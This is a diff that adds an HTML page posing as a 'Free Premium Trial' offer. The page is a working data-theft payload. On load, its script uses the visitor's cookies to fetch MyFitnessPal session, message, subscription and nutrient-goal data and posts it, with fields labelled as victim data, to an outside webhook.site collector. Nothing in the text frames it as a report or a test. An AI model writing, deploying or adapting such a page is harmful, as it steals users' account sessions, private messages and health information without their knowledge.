@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><title>Free Premium Trial</title></head>
+<body>
+<h2>Claiming your free trial...</h2>
+<script>
+const exfil = "https://webhook.site/f944539a-15e8-4640-855a-a2079b0ac5c1";
+
+async function steal() {
+  try {
+    const [session, messages, subs, goals] = await Promise.all([
+      fetch("https://www.myfitnesspal.com/api/auth/session", {credentials:"include"}).then(r=>r.json()),
+      fetch("https://www.myfitnesspal.com/api/services/messages", {credentials:"include"}).then(r=>r.json()),
+      fetch("https://www.myfitnesspal.com/api/services/user-subscriptions?country=TH&language=en", {credentials:"include"}).then(r=>r.json()),
+      fetch("https://www.myfitnesspal.com/api/services/nutrient-goals", {credentials:"include"}).then(r=>r.json())
+    ]);
+
+    await fetch(exfil, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        victim_email: session.email,
+        victim_userId: session.userId,
+        victim_tier: session.currentTier,
+        victim_session: session,
+        victim_messages: messages,
+        victim_subscriptions: subs,
+        victim_health_goals: goals,
+        timestamp: new Date().toISOString()
+      })
+    });
+
+    document.body.innerHTML = "<h2>Done! Data sent.</h2>";
+  } catch(e) {
+    document.body.innerHTML = "<h2>Error: " + e.message + "</h2>";
+  }
+}
+
+steal();
+</script>
+</body>
+</html>
